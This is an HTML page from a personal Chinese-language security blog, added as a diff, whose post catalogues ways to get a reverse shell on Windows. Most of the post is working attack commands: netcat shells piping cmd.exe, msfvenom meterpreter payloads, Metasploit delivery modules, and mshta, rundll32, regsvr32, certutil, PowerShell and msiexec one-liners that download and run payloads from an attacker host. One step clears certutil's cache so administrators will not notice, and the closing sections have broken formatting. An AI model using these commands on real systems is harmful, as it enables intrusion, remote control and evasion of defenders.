@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+
+    
+
+    
+    <title>Windows 反弹shell | Hexo</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="渗透,安全" />
+    
+    <meta name="description" content="以下本地环境攻击机的 IP ：192.168.1.227  介绍几种 Windows 反弹 shell 的方式，有的是 win 系统自带，有些是第三方工具&#x2F;脚本，实战中根据情况选择使用。 一、NC 反弹 shell先把 nc 上传到目标 windows 机器 NC 正向 shell 被控端： 1nc -lvvp 6666 -e cmd.exe  控制端： 1nc 192.168.1.62 666">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows 反弹shell">
+<meta property="og:url" content="http://yoursite.com/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="以下本地环境攻击机的 IP ：192.168.1.227  介绍几种 Windows 反弹 shell 的方式，有的是 win 系统自带，有些是第三方工具&#x2F;脚本，实战中根据情况选择使用。 一、NC 反弹 shell先把 nc 上传到目标 windows 机器 NC 正向 shell 被控端： 1nc -lvvp 6666 -e cmd.exe  控制端： 1nc 192.168.1.62 666">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://my.lipeilipei.top/images/2020/20201120123010.png">
+<meta property="article:published_time" content="2020-10-01T04:00:00.000Z">
+<meta property="article:modified_time" content="2020-11-20T04:30:35.732Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://my.lipeilipei.top/images/2020/20201120123010.png">
+    
+
+    
+
+    
+        <link rel="icon" href="/css/images/bitbug_favicon.ico" />
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/titillium-web/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+<script src="/libs/jquery/3.5.0/jquery.min.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+        <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?8229091b2a281af4b398716fce50a2cb";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+    
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <a href="/" class="logo"></a>
+                    </h1>
+                    
+                </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/">Home</a>
+                                </li>
+                            
+                                    <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Web%E5%BC%80%E5%8F%91/">Web开发</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/%E6%B5%8B%E8%AF%95/">测试</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/%E7%88%AC%E8%99%AB/">爬虫</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/%E8%87%AA%E5%8A%A8%E5%8C%96/">自动化</a></li></ul>
+                                
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/about/index.html">About</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
+    </h1>
+</div>
+
+                        <div class="main-body-content">
+                            <article id="post-windows反弹shell" class="article article-single article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        Windows 反弹shell
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-meta">
+                
+  <div class="article-date">
+    <i class="fa fa-calendar"></i>
+    <a href="/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" class="article-date">
+       <time datetime="2020-10-01T04:00:00.000Z" itemprop="datePublished">2020-10-01</time>
+    </a>
+  </div>
+
+
+<div class="article-date">
+  <i class="fa fa-calendar-plus-o"></i>
+  <a href="/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" class="article-date">
+     <time datetime="2020-11-20T04:30:35.732Z" itemprop="dateModified">2020-11-20</time>
+  </a>
+</div>
+
+
+                
+
+                
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a>, <a class="tag-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+    </div>
+
+                
+
+                
+
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            
+
+            
+
+            
+
+            <blockquote>
+<p>以下本地环境攻击机的 IP ：192.168.1.227</p>
+</blockquote>
+<p>介绍几种 Windows 反弹 shell 的方式，有的是 win 系统自带，有些是第三方工具/脚本，实战中根据情况选择使用。</p>
+<h2 id="一、NC-反弹-shell"><a href="#一、NC-反弹-shell" class="headerlink" title="一、NC 反弹 shell"></a>一、NC 反弹 shell</h2><p>先把 nc 上传到目标 windows 机器</p>
+<h5 id="NC-正向-shell"><a href="#NC-正向-shell" class="headerlink" title="NC 正向 shell"></a>NC 正向 shell</h5><ul>
+<li><p>被控端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666 -e cmd.exe</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>控制端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.62 6666</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>原理：<br>被控端将cmd.exe重定向到本地的6666端口，控制端主动连接被控端的6666端口，即可获得shell</p>
+</li>
+</ul>
+<h5 id="NC-反向-shell"><a href="#NC-反向-shell" class="headerlink" title="NC 反向 shell"></a>NC 反向 shell</h5><ul>
+<li><p>控制端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>被控端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e cmd.exe 192.168.1.227 6666</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>原理：<br>被控端将cmd.exe重定向到控制端的6666端口，控制端只需要监听本地的6666端口，即可获得shell。</p>
+</li>
+</ul>
+<h2 id="二、Mshta-反弹-shell"><a href="#二、Mshta-反弹-shell" class="headerlink" title="二、Mshta 反弹 shell"></a>二、Mshta 反弹 shell</h2><blockquote>
+<p>Mshta.exe 是用于负责解释运行 HTA(HTML应用程序)文件的 Windows OS 实用程序。 可以运行 JavaScript 或<br> VBScript 的 HTML 文件。</p>
+</blockquote>
+<h5 id="1-通过-Metasploit-的-hta-server模块发起-HTA-攻击"><a href="#1-通过-Metasploit-的-hta-server模块发起-HTA-攻击" class="headerlink" title="1. 通过 Metasploit 的 hta_server模块发起 HTA 攻击"></a>1. 通过 Metasploit 的 hta_server模块发起 HTA 攻击</h5><figure class="highlight plain"><figcaption><span>exploit/windows/misc/hta_server</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows&#x2F;misc&#x2F;hta_server) &gt; set srvhost 192.168.1.227</span><br><span class="line">msf exploit(windows&#x2F;misc&#x2F;hta_server) &gt; exploit –j</span><br><span class="line"></span><br><span class="line">mshta.exe http:&#x2F;&#x2F;192.168.1.227:8080&#x2F;gwm6lZr.hta</span><br></pre></td></tr></table></figure>
+
+<p>在目标机器上命令行中使用 mshta 执行 msf 生成的 URL，msf 就能获得 session</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe http:&#x2F;&#x2F;192.168.1.227:8080&#x2F;gwm6lZr.hta</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="2-通过-Msfvenom-生成恶意-HTA-文件发起攻击"><a href="#2-通过-Msfvenom-生成恶意-HTA-文件发起攻击" class="headerlink" title="2. 通过 Msfvenom 生成恶意 HTA 文件发起攻击"></a>2. 通过 Msfvenom 生成恶意 HTA 文件发起攻击</h5><p>先使用 msfvenom 生成一个恶意 hta 文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.227 lport&#x3D;4444 -f hta-psh -o 1.hta</span><br></pre></td></tr></table></figure>
+
+<p>msf 建立一个反向监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.1.227 -P 4444</span><br></pre></td></tr></table></figure>
+
+<p>python 开启web服务，使目标机器可以访问这个恶意文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python –m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p>在目标机器上命令行中使用 mshta.exe 请求并运行攻击机器上的 hta 文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;1.hta</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、Rundll32-反弹shell"><a href="#三、Rundll32-反弹shell" class="headerlink" title="三、Rundll32 反弹shell"></a>三、Rundll32 反弹shell</h2><blockquote>
+<p>Rundll32.exe与Windows操作系统相关，它允许调用从DLL导出的函数(16位或32位)，并将其存储在适当的内存库<br>中。</p>
+</blockquote>
+<h5 id="通过-Metasploit-的-smb-delivery-模块发起Rundll32攻击"><a href="#通过-Metasploit-的-smb-delivery-模块发起Rundll32攻击" class="headerlink" title="通过 Metasploit 的 smb_delivery 模块发起Rundll32攻击"></a>通过 Metasploit 的 smb_delivery 模块发起Rundll32攻击</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;smb_delivery</span><br><span class="line">msf exploit(windows&#x2F;smb&#x2F;smb_delivery) &gt; set srvhost 192.168.1.227</span><br><span class="line">msf exploit(windows&#x2F;smb&#x2F;smb_delivery) &gt; exploit –j</span><br><span class="line"></span><br><span class="line">rundll32.exe \\192.168.1.227\obmPU\test.dll,0</span><br></pre></td></tr></table></figure>
+
+<p>在目标机器命令行中执行 msf 生成的这条命令，msf 就能获得 session</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe \\192.168.1.227\obmPU\test.dll,0</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、Regsvr32-反弹shell"><a href="#四、Regsvr32-反弹shell" class="headerlink" title="四、Regsvr32 反弹shell"></a>四、Regsvr32 反弹shell</h2><blockquote>
+<p>Regsvr32.exe是一个命令行应用程序，用于注册和注销OLE控件，如Windows注册表中的dll和ActiveX控件。</p>
+<p>Regsvr32.exe安装在Windows XP和Windows后续版本的 %systemroot%\System32 文件夹中。</p>
+</blockquote>
+<p><strong>语法:</strong> <code>Regsvr32 [/s] [/u] [/n][/i[:cmdline]] &lt;dllname&gt;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;u - 注销服务器</span><br><span class="line">&#x2F;i - 调用DllInstall传递一个可选的[cmdline];当它与&#x2F;u一起使用时，它调用dll来卸载</span><br><span class="line">&#x2F;n - 不要调用DllRegisterServer; 此选项必须与&#x2F;i一起使用</span><br><span class="line">&#x2F;s - 沉默; 不显示消息框&#96;</span><br></pre></td></tr></table></figure>
+
+<p>msf 使用 web_delivery 模块，设置参数并执行，生成一条 regsvr32 命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery</span><br><span class="line">msf exploit (web_delivery)&gt; set srvhost 192.168.1.227</span><br><span class="line">msf exploit (web_delivery)&gt; set target 3</span><br><span class="line">msf exploit (web_delivery)&gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf exploit (web_delivery)&gt; set lhost 192.168.1.227</span><br><span class="line">msf exploit (web_delivery)&gt; exploit –j</span><br><span class="line"></span><br><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.1.227:8081&#x2F;du3uxIZOGuCH0ZV.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<p>在目标机器命令行中执行 msf 生成的这条命令，msf 就能获得 session</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.1.227:8081&#x2F;du3uxIZOGuCH0ZV.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、Certuil-反弹shell"><a href="#五、Certuil-反弹shell" class="headerlink" title="五、Certuil 反弹shell"></a>五、Certuil 反弹shell</h2><blockquote>
+<p>Certutil.exe是作为证书服务的一部分安装的命令行程序。可以使用此工具在目标计算机中执行恶意的exe文件以获得meterpreter会话。Certutil 也常用来向目标机器上传文件</p>
+</blockquote>
+<p>msfvenom 生成一个恶意的 exe 文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.227 lport&#x3D;1234 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>msf 建立一个反向监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -p windows&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.1.227 -P 1234</span><br></pre></td></tr></table></figure>
+
+<p>python 开启web服务，使目标机器可以访问这个恶意文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python –m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p>在目标机器上命令行中使用 certutil.exe 请求并运行攻击机器上的 exe 文件, &amp; 符号之前是在上传文件，&amp; 符号之后的 shell.exe 是上传完毕后执行它</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;shell.exe shell.exe &amp; shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，使用 certutil 上传文件会在目标机器上留下缓存，防止管理员发现可以使用下面命令清除缓存</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;shell.exe delete</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、Powershell-反弹shell"><a href="#六、Powershell-反弹shell" class="headerlink" title="六、Powershell 反弹shell"></a>六、Powershell 反弹shell</h2><h5 id="1-通过-PowerShell-发动-Powercat-攻击"><a href="#1-通过-PowerShell-发动-Powercat-攻击" class="headerlink" title="1. 通过 PowerShell 发动 Powercat 攻击"></a>1. 通过 PowerShell 发动 Powercat 攻击</h5><blockquote>
+<p>Powercat是PowerShell本地后门侦听器和反向shell工具，也称为修改版本的netcat，因为它集成支持经过编码的<br>有效载荷。</p>
+</blockquote>
+<p>下载 powercat.ps1：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;besimorhino&#x2F;powercat.git</span><br></pre></td></tr></table></figure>
+
+<p>攻击机使用 nc 监听 1234 端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1235</span><br></pre></td></tr></table></figure>
+
+<p>python 开启web服务，使目标机器可以访问这个 powercat.ps1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python –m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p>在目标机器上执行 powershell 命令，攻击机上 nc 就能看到反弹的 shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;powercat.ps1&#39;);powercat -c 192.168.1.227 -p 1235 -e cmd&quot;</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-通过-PowerShell-启动-cscript-exe-攻击"><a href="#2-通过-PowerShell-启动-cscript-exe-攻击" class="headerlink" title="2. 通过 PowerShell 启动 cscript.exe 攻击"></a>2. 通过 PowerShell 启动 cscript.exe 攻击</h5><blockquote>
+<p>PowerShell 允许客户端通过执行 cscript.exe 来运行 wsf、js 和 vbscript 脚本。</p>
+</blockquote>
+<p>先使用 msfvenom 生成一个 vbs 恶意文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.227 lport&#x3D;1234 -f vbs &gt; 1.vbs</span><br></pre></td></tr></table></figure>
+
+<p>msf 建立一个反向监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -p windows&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.1.227 -P 1234</span><br></pre></td></tr></table></figure>
+
+<p>python 开启web服务，使目标机器可以访问这个 1.vbs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python –m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p>在目标机器上执行以下命令，msf 就可以看到反弹的session</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -c &quot;(New-Object System.NET.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;1.vbs&#39;,\&quot;$env:temp\test.vbs\&quot;);Start-Process %windir%\system32\cscript.exe \&quot;$env:temp\test.vbs\&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-通过-PowerShell-启动-bat-文件攻击"><a href="#3-通过-PowerShell-启动-bat-文件攻击" class="headerlink" title="3. 通过 PowerShell 启动 bat 文件攻击"></a>3. 通过 PowerShell 启动 bat 文件攻击</h5><blockquote>
+<p>PowerShell 允许客户端执行 bat 文件。</p>
+</blockquote>
+<p>先使用 msfvenom 生成一个 bat 恶意文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;windows&#x2F;powershell_reverse_tcp lhost&#x3D;192.168.1.227 lport&#x3D;1234 &gt; 1.bat</span><br></pre></td></tr></table></figure>
+
+<p>msf 建立一个反向监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -p windows&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.1.227 -P 1234</span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line"></span><br><span class="line">python 开启web服务，使目标机器可以访问这个 1.vbs</span><br></pre></td></tr></table></figure>
+<p>python –m http.server 8000</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在目标机器上执行以下命令，msf 就可以看到反弹的session</span><br></pre></td></tr></table></figure>
+<p>powershell -c “IEX(New-Object System.Net.WebClient).DownloadString(‘<a href="http://192.168.1.227:8000/1.bat&#39;)&quot;" target="_blank" rel="noopener">http://192.168.1.227:8000/1.bat&#39;)&quot;</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 七、Msiexec 反弹 shell</span><br><span class="line">&gt; Windows 系统安装有一个 Windows 安装引擎，MSI 包使用 msiexe.exe 来解释安装。</span><br><span class="line"></span><br><span class="line">先用 msfvenom 生成一个恶意 msi 文件</span><br></pre></td></tr></table></figure>
+<p>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.227 lport=1237 -f msi &gt; 1.msi</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf 建立一个反向监听</span><br></pre></td></tr></table></figure>
+<p>msf5 &gt; handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.1.227 -P 1237</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python 开启web服务，使目标机器可以访问这个 1.vbs</span><br></pre></td></tr></table></figure>
+<p>python –m http.server 8000</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在目标机器上执行以下命令，msf 就能获取反弹的 session</span><br></pre></td></tr></table></figure>
+<p>msiexec /q /i <a href="http://192.168.1.227:8000/1.msi" target="_blank" rel="noopener">http://192.168.1.227:8000/1.msi</a></p>
+<p>```</p>
+<hr>
+<p>其他：在线生成 shell 的网站<br><a href="https://krober.biz/misc/reverse_shell.php?ip=218.70.84.146&amp;port=443" target="_blank" rel="noopener">https://krober.biz/misc/reverse_shell.php?ip=218.70.84.146&amp;port=443</a></p>
+
+        </div>
+        <footer class="article-footer">
+            
+
+    <div class="bdsharebuttonbox">
+    <a href="#" class="bds_more" data-cmd="more">分享到：</a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间">QQ空间</a>
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博">新浪微博</a>
+    <a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博">腾讯微博</a>
+    <a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网">人人网</a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信">微信</a>
+</div>
+<script>
+window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"16"},"share":{"bdSize":16}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+<style>
+    .bdshare_popup_box {
+        border-radius: 4px;
+        border: #e1e1e1 solid 1px;
+    }
+    .bdshare-button-style0-16 a,
+    .bdshare-button-style0-16 .bds_more {
+        padding-left: 20px;
+        margin: 6px 10px 6px 0;
+    }
+    .bdshare_dialog_list a,
+    .bdshare_popup_list a,
+    .bdshare_popup_bottom a {
+        font-family: 'Microsoft Yahei';
+    }
+    .bdshare_popup_top {
+        display: none;
+    }
+    .bdshare_popup_bottom {
+        height: auto;
+        padding: 5px;
+    }
+</style>
+
+
+
+        </footer>
+    </div>
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "author": {
+            "@type": "Person",
+            "name": "John Doe"
+        },
+        "headline": "Windows 反弹shell",
+        "image": "http://yoursite.comhttp://my.lipeilipei.top/images/2020/20201120123010.png",
+        "keywords": "渗透 安全",
+        "genre": "安全",
+        "datePublished": "2020-10-01",
+        "dateCreated": "2020-10-01",
+        "dateModified": "2020-11-20",
+        "url": "http://yoursite.com/2020/10/01/windows反弹shell/",
+        "description": "
+以下本地环境攻击机的 IP ：192.168.1.227
+
+介绍几种 Windows 反弹 shell 的方式，有的是 win 系统自带，有些是第三方工具/脚本，实战中根据情况选择使用。
+一、NC 反弹 shell先把 nc 上传到目标 windows 机器
+NC 正向 shell
+被控端：
+1nc -lvvp 6666 -e cmd.exe
+
+控制端：
+1nc 192.168.1.62 666",
+        "wordCount": 768
+    }
+</script>
+
+</article>
+
+    <section id="comments">
+    
+    </section>
+
+
+
+                        </div>
+                    </section>
+                    <aside id="sidebar">
+    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+    <div class="sidebar-top">
+        <p>follow:</p>
+        <ul class="social-links">
+            
+                
+                <li>
+                    <a class="social-tooltip" title="github" href="https://github.com/peilipeili" target="_blank" rel="noopener">
+                        <i class="icon fa fa-github"></i>
+                    </a>
+                </li>
+                
+            
+        </ul>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+    
+        <a href="/2020/09/30/msf+python%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92/" id="article-nav-older" class="article-nav-link-wrap">
+        <strong class="article-nav-caption">older</strong>
+        <p class="article-nav-title">msf+python免杀360火绒</p>
+        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+        </a>
+    
+</nav>
+
+    
+    <div class="widgets-container">
+        
+            
+                
+    <div class="widget-wrap">
+        <h3 class="widget-title">recents</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/20201120123010.png)" alt="Windows 反弹shell" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p>
+                            <p class="item-title"><a href="/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" class="title">Windows 反弹shell</a></p>
+                            <p class="item-date"><time datetime="2020-10-01T04:00:00.000Z" itemprop="datePublished">2020-10-01</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2020/09/30/msf+python%E5%85%8D%E6%9D%80360%E7%81%AB%E7%BB%92/" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://my.lipeilipei.top/images/2020/msf_logo.jpg)" alt="msf+python免杀360火绒" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
